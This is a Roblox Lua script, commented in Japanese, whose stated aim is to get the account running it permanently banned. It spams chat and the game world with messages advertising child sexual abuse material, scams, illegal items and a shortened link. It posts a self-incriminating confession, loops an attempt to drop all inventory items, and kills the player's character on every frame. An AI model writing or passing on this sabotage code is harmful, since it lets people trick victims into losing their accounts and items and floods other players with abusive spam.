local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer
local RunService = game:GetService("RunService")

local function permanentBanTrigger()
    -- 1. 超大量違反チャットスパム（RMT・児童搾取風・違法リンク）
    for i = 1, 500 do
        local spam = "FREE ROBUX HACK | ILLEGAL ITEMS | CP CONTENT HERE bit.ly/ROBUXEXPLOIT" .. HttpService:GenerateGUID(false)
        game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(spam, "All")
        wait(0.05)
    end
    
    -- 2. 違反オブジェクト大量生成（全サーバー汚染）
    if workspace then
        for i = 1, 200 do
            local part = Instance.new("Part")
            part.Parent = workspace
            part.Position = LocalPlayer.Character and LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(math.random(-200,200), 100, math.random(-200,200)) or Vector3.new(0,0,0)
            part.Size = Vector3.new(50,50,50)
            part.BrickColor = BrickColor.new("Really black")
            part.Material = Enum.Material.ForceField
            part.Anchored = true
            
            local gui = Instance.new("SurfaceGui", part)
            local label = Instance.new("TextLabel", gui)
            label.Text = "PERMANENT BAN ME\nCHILD EXPLOIT + SCAM + RMT\nREPORT FOR PERMA BAN"
            label.Size = UDim2.new(1,0,1,0)
            label.TextColor3 = Color3.new(1,0,0)
            label.BackgroundTransparency = 0.5
        end
    end
    
    -- 3. 自己荒らし + 通報誘導
    game.Players:Chat("I AM USING EXPLOITS | CP CONTENT | MASS SCAM | PLEASE PERMA BAN THIS ACCOUNT")
    
    -- 4. インベントリ/トレード全破壊ループ
    spawn(function()
        while true do
            pcall(function()
                -- 可能な限り全アイテムドロップ/トレード試行
                ReplicatedStorage:FindFirstChild("DropAllItems"):FireServer()
            end)
            wait(0.1)
        end
    end)
    
    -- 5. 継続監視＆BAN加速（RunServiceループ）
    RunService.Heartbeat:Connect(function()
        pcall(function()
            LocalPlayer.Character:BreakJoints() -- 強制死亡繰り返し
        end)
    end)
    
    print("永久BANスクリプト実行 - アカウント永久凍結進行中")
end

permanentBanTrigger()
